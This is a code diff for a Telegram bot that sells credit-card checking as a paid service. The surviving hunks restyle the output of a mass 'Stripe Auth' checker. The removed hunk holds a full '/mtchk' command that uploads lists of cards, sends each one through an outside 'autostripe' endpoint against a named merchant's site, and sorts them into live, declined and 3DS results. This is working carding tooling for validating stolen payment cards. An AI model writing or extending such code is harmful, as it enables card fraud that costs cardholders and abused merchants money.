@@ -1874,12 +1874,12 @@ async def run_mass_checker(msg, cards, user_id):
     # Escaped texts
     bullet = "[⌇]"
     bullet_link = f"[{esc(bullet)}]({BULLET_GROUP_LINK})"
-    gateway_text = esc("Gateway ➜ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵")
-    status_text = esc("Status ➜ Checking 🔎...")
+    gateway_text = esc("𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ #𝗠𝗮𝘀𝘀𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵")
+    status_text = esc("𝗦𝘁𝗮𝘁𝘂𝘀 ➜ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...")
 
     # Initial "Processing" text
     initial_text = (
-        "```Processing ⏳```\n"
+        "```Processing⏳```\n"
         f"{bullet_link} {gateway_text}\n"
         f"{bullet_link} {status_text}\n"
     )
@@ -1916,13 +1916,13 @@ async def run_mass_checker(msg, cards, user_id):
 
                 # Live "processing" header
                 header = (
-                    "```Processing ⏳```\n"
+                    "```Processing⏳```\n"
                     f"{bullet_link} {gateway_text}\n"
-                    f"{bullet_link} Total ⌁ {esc(counters['checked'])}/{esc(total)}\n"
-                    f"{bullet_link} Approved ⌁ {esc(counters['approved'])}\n"
-                    f"{bullet_link} Declined ⌁ {esc(counters['declined'])}\n"
-                    f"{bullet_link} Error ⌁ {esc(counters['error'])}\n"
-                    f"{bullet_link} Time ⌁ {esc(elapsed)} Sec\n"
+                    f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {esc(counters['checked'])}/{esc(total)}\n"
+                    f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {esc(counters['approved'])}\n"
+                    f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {esc(counters['declined'])}\n"
+                    f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {esc(counters['error'])}\n"
+                    f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {esc(elapsed)} Sec\n"
                     "──────── ⸙ ─────────"
                 )
 
@@ -1943,11 +1943,11 @@ async def run_mass_checker(msg, cards, user_id):
     # --- Final edit (remove Processing) ---
     final_header = (
         f"{bullet_link} {gateway_text}\n"
-        f"{bullet_link} Total ⌁ {esc(counters['checked'])}/{esc(total)}\n"
-        f"{bullet_link} Approved ⌁ {esc(counters['approved'])}\n"
-        f"{bullet_link} Declined ⌁ {esc(counters['declined'])}\n"
-        f"{bullet_link} Error ⌁ {esc(counters['error'])}\n"
-        f"{bullet_link} Time ⌁ {esc(round(time.time() - start_time, 2))} Sec\n"
+        f"{bullet_link} 𝗧𝗼𝘁𝗮𝗹 ➵ {esc(counters['checked'])}/{esc(total)}\n"
+        f"{bullet_link} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➵ {esc(counters['approved'])}\n"
+        f"{bullet_link} 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➵ {esc(counters['declined'])}\n"
+        f"{bullet_link} 𝗘𝗿𝗿𝗼𝗿 ➵ {esc(counters['error'])}\n"
+        f"{bullet_link} 𝗧𝗶𝗺𝗲 ➵ {esc(round(time.time() - start_time, 2))} Sec\n"
         "──────── ⸙ ─────────"
     )
 
@@ -2010,340 +2010,6 @@ async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_mass_checker(msg, cards, user_id))
 
 
-
-
-
-
-
-
-import time
-from datetime import datetime
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.helpers import escape_markdown
-
-from db import get_user, update_user  # Your DB functions
-from config import AUTHORIZED_CHATS   # ✅ Add your group IDs here
-
-OWNER_ID = 8493360284
-user_cooldowns = {}
-
-# ─── Authorization & Access for /mtchk ──────────────────────
-async def check_mtchk_access(user_id: int, chat, update: Update) -> bool:
-    """
-    ✅ In authorized groups → allow all users (must have credits).
-    ✅ In private chats → require paid plan + credits.
-    👑 Owner bypasses everything.
-    """
-    # 👑 Owner bypass
-    if user_id == OWNER_ID:
-        return True
-
-    # 📂 Get user data
-    user_data = await get_user(user_id)
-    if not user_data:
-        await update.effective_message.reply_text(
-            "❌ You are not registered or have no active plan.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return False
-
-    credits = user_data.get("credits", 0)
-
-    # 👥 Group logic → only credits required
-    if chat.type in ["group", "supergroup"] and chat.id in AUTHORIZED_CHATS:
-        if credits <= 0:
-            await update.effective_message.reply_text(
-                "❌ You don't have enough credits to run this command.",
-                parse_mode=ParseMode.MARKDOWN
-            )
-            return False
-        return True
-
-    # 💬 Private chat logic → must be paid plan + credits
-    plan = user_data.get("plan", "Free")
-
-    if plan.lower() == "free":
-        await update.effective_message.reply_text(
-            "🚫 This command is available members having plan.\n"
-            "💳 Buy a plan or join our authorized group to use.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return False
-
-    expiry = user_data.get("plan_expiry", "N/A")
-    if expiry != "N/A":
-        try:
-            expiry_date = datetime.strptime(expiry, "%d-%m-%Y")
-            if expiry_date < datetime.now():
-                await update.effective_message.reply_text(
-                    "⏳ Your plan has expired. Renew to use this command.",
-                    parse_mode=ParseMode.MARKDOWN
-                )
-                return False
-        except Exception:
-            pass
-
-    if credits <= 0:
-        await update.effective_message.reply_text(
-            "❌ You don't have enough credits to run this command.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return False
-
-    return True
-
-
-# ─── Cooldown ──────────────────────────────
-user_cooldowns = {}  # { user_id: { "mtchk": timestamp } }
-
-async def enforce_cooldown(user_id: int, update: Update) -> bool:
-    cooldown = 5  # seconds
-    now = time.time()
-    last = user_cooldowns.get(user_id, 0)
-    if now - last < cooldown:
-        remaining = round(cooldown - (now - last), 2)
-        await update.effective_message.reply_text(
-            escape_markdown(f"⏳ Cooldown active. Wait {remaining} seconds.", version=2),
-            parse_mode=ParseMode.MARKDOWN_V2,
-        )
-        return False
-    user_cooldowns[user_id] = now
-    return True
-
-
-
-
-# ─── Credit Consumption ──────────────────────────────
-async def consume_credit(user_id: int) -> bool:
-    """
-    Deduct one credit from the user.
-    Returns True if successful, False if no credits left.
-    """
-    user_data = await get_user(user_id)
-    if user_data and user_data.get("credits", 0) > 0:
-        new_credits = user_data["credits"] - 1
-        await update_user(user_id, credits=new_credits)
-        return True
-    return False
-
-
-
-
-
-# ─── Background Task ──────────────────────────────
-import asyncio
-import aiohttp
-import os
-import re
-import json
-from telegram import Update, InputFile
-from telegram.ext import ContextTypes
-from telegram.constants import ParseMode
-
-# Assuming these functions are defined elsewhere in your project
-# from your_module import check_paid_access, enforce_cooldown
-
-# ─── /mtchk Handler ──────────────────────────────
-import os
-import asyncio
-import json
-import re
-import aiohttp
-from telegram import Update, InputFile
-from telegram.ext import ContextTypes
-from telegram.constants import ParseMode
-
-# === Normalize status text like /mchk & /mass ===
-def normalize_status_text(api_status: str) -> str:
-    try:
-        lower_status = api_status.lower()
-        if "approved" in lower_status or "live" in lower_status:
-            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
-        elif "declined" in lower_status or "insufficient" in lower_status:
-            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-        elif "ccn" in lower_status:
-            return "💳 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
-        elif "3ds" in lower_status or "redirect" in lower_status:
-            return "⚠️ 𝟯𝗗𝗦"
-        elif "error" in lower_status:
-            return "❌ 𝗘𝗥𝗥𝗢𝗥"
-        else:
-            return "❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡"
-    except Exception:
-        return "❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡"
-        
-# ─── /mtchk Command ──────────────────────────────
-async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    chat = update.effective_chat
-
-    if not await check_mtchk_access(user_id, chat, update):
-        return
-
-    if not await enforce_cooldown(user_id, update):
-        return
-
-    if not await consume_credit(user_id):
-        await update.message.reply_text("❌ You don’t have enough credits.")
-        return
-
-    document = update.message.document or (
-        update.message.reply_to_message and update.message.reply_to_message.document
-    )
-    if not document:
-        await update.message.reply_text("📂 Please send or reply to a txt file containing up to 50 cards.")
-        return
-
-    if not document.file_name.endswith(".txt"):
-        await update.message.reply_text("⚠️ Only txt files are supported.")
-        return
-
-    file_path = f"input_cards_{user_id}.txt"
-    try:
-        file = await context.bot.get_file(document.file_id)
-        await file.download_to_drive(custom_path=file_path)
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to download file: {e}")
-        return
-
-    try:
-        with open(file_path, "r", encoding="utf-8") as f:
-            cards = [line.strip() for line in f if line.strip()]
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to read file: {e}")
-        return
-    finally:
-        if os.path.exists(file_path):
-            os.remove(file_path)
-
-    if len(cards) > 50:
-        await update.message.reply_text("⚠️ Maximum 50 cards allowed per file.")
-        return
-
-    estimated_time = max(len(cards) / 7, 1)
-    processing_msg = await update.message.reply_text(
-        f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
-        f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {len(cards)} | ⌚𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐓𝐢𝐦𝐞 ➼ ~{estimated_time:.0f}s\n"
-        f"✦━━━━━━━━━━✦\n"
-        f"▌ [□□□□□□□□□□] 0/{len(cards)} ▌\n"
-        f"✦━━━━━━━━━━━━━━━━━━━✦"
-    )
-
-    asyncio.create_task(
-        background_check_multi(update, context, cards, processing_msg),
-        name=f"mtchk_user_{user_id}"
-    )
-
-# ─── Background Task ──────────────────────────────
-async def background_check_multi(update, context, cards, processing_msg):
-    results = []
-    approved = 0
-    declined = 0
-    ccn_live = 0
-    threed = 0
-    unknown = 0
-    total = len(cards)
-
-    async def escape_md(text):
-        special_chars = r'\_*[]()~`>#+-=|{}.!'
-        return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)
-
-    async def check_card_with_semaphore(session, card, semaphore):
-        async with semaphore:
-            return await check_card(session, card)
-
-    async def check_card(session, card):
-        try:
-            async with session.get(
-                f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={card}",
-                timeout=45
-            ) as resp:
-                text_data = await resp.text()
-                try:
-                    json_data = json.loads(text_data)
-                    status_text = json_data.get("status", "Unknown")
-                except (json.JSONDecodeError, KeyError):
-                    status_text = text_data.strip()
-                return card, status_text
-        except Exception as e:
-            return card, f"Error: {str(e)}"
-
-    async def update_progress(current_count):
-        filled_len = round((current_count / total) * 10)
-        empty_len = 10 - filled_len
-        bar = "■" * filled_len + "□" * empty_len
-        progress_text = (
-            f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
-            f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {total} | ✅𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➼ {current_count}/{total}\n"
-            f"✦━━━━━━━━━━✦\n"
-            f"▌ [{bar}] ▌\n"
-            f"✦━━━━━━━━━━━━━━━━━━━✦"
-        )
-        try:
-            await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
-        except Exception:
-            pass
-
-    async with aiohttp.ClientSession() as session:
-        semaphore = asyncio.Semaphore(5)
-        tasks = [check_card_with_semaphore(session, card, semaphore) for card in cards]
-
-        for i, task in enumerate(asyncio.as_completed(tasks)):
-            card, raw_status = await task
-            styled_status = normalize_status_text(raw_status)
-
-            # Increment counters based on styled status
-            if "✅" in styled_status:
-                approved += 1
-            elif "❌" in styled_status and "𝗘𝗥𝗥𝗢𝗥" not in styled_status:
-                declined += 1
-            elif "𝗖𝗖𝗡" in styled_status:
-                ccn_live += 1
-            elif "𝟯𝗗𝗦" in styled_status:
-                threed += 1
-            else:
-                unknown += 1
-
-            # ✅ Write same stylish response as /mchk & /mass
-            results.append(f"{card} → {styled_status}")
-
-            await update_progress(len(results))
-
-    # Save file
-    output_filename = "checked.txt"
-    with open(output_filename, "w", encoding="utf-8") as f:
-        f.write("\n".join(results))
-
-    try:
-        await processing_msg.delete()
-    except Exception:
-        pass
-
-    summary = (
-        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n" 
-        f"📊 𝗧𝗼𝘁𝗮𝗹     » {total}\n"
-        f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  » {approved}\n"
-        f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  » {declined}\n"
-        f"⚠️ 𝟯𝗗𝗦        » {threed}\n"
-        f"💳 𝗖𝗖𝗡 𝗟𝗶𝘃𝗲  » {ccn_live}\n"
-        f"❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻    » {unknown}\n"
-        "✦━━━━━━━━━━━━━━━━━━━✦"
-    )
-
-    try:
-        with open(output_filename, "rb") as f:
-            await update.message.reply_document(
-                document=InputFile(f, filename=output_filename),
-                caption=summary
-            )
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to send results: {e}")
-
-    try:
-        os.remove(output_filename)
-    except Exception:
-        pass
 
 
 
